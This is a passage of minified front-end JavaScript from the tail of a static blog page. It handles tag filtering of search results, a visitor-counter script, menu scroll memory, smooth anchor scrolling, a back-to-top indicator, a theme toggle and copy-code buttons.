i,r,a=document.getElementById("searchResults");if(t===e){t=null,o.classList.remove("active"),a.innerHTML="";return}n.querySelectorAll(".tag-chip").forEach(function(e){e.classList.remove("active")}),t=e,o.classList.add("active"),r=s.filter(function(t){return(t.tags||[]).includes(e)||(t.categories||[]).includes(e)}),i="",r.forEach(function(e){i+='<li class="post-entry"><header class="entry-header">'+e.title+'&nbsp;&raquo;</header><a href="'+e.permalink+'" aria-label="'+e.title.replace(/"/g,"&quot;")+'"></a></li>'}),a.innerHTML=i}o=document.getElementById("searchInput"),o&&o.addEventListener("input",function(){t&&(t=null,n.querySelectorAll(".tag-chip").forEach(function(e){e.classList.remove("active")}))})})()</script><script async src=https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>(function(){var e=document.getElementById("top-link"),t=e&&e.querySelector(".top-link-ring-progress"),s=125.66;function n(){var n=window.scrollY,o=document.documentElement.scrollHeight-window.innerHeight,i=o>0?n/o:0;n>300?(e.style.visibility="visible",e.style.opacity="1"):(e.style.visibility="hidden",e.style.opacity="0"),t&&(t.style.strokeDashoffset=s*(1-i))}window.addEventListener("scroll",n,{passive:!0}),n()})()</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
